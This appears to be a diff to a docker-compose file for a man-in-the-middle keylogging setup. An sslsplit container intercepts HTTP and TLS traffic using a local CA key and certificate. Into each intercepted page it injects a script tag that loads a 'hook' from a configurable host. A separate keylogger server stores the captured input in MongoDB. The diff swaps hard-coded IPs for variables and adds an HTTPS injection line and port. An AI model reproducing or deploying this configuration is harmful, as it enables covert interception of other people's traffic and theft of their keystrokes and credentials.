@@ -8,8 +8,8 @@ services:
       context: ./sslsplit
     container_name: keylogger_sslsplit
     environment:
-      - HOOK_HOST=192.168.1.1
-      - HOOK_PORT_HTTP=8081
+      - HOOK_HOST=$HOOK_HOST
+      - HOOK_PORT_HTTP=$HOOK_PORT_HTTP
     command:
       -k key/ca.key  
       -c key/ca.crt 
@@ -19,6 +19,7 @@ services:
       -l log/connections.log 
       -S log 
       -H "<script src='http://$HOOK_HOST:$HOOK_PORT_HTTP/hook' type='text/javascript'></script>" 
+      -H "<script src='https://$HOOK_HOST:$HOOK_PORT_HTTPS/hook' type='text/javascript'></script>" 
       tcp 0.0.0.0 8080
       ssl 0.0.0.0 8443
     network_mode: "host"
@@ -32,9 +33,10 @@ services:
     build:
       context: ./keyloggerServer
     container_name: keylogger
-    command: --db=mongo --hook_host=192.168.10.216
+    command: --db=mongo --hook_host=$HOOK_HOST
     ports:
       - 8081:80
+      - 8445:443  
       - 7000:7000
     restart: unless-stopped
 
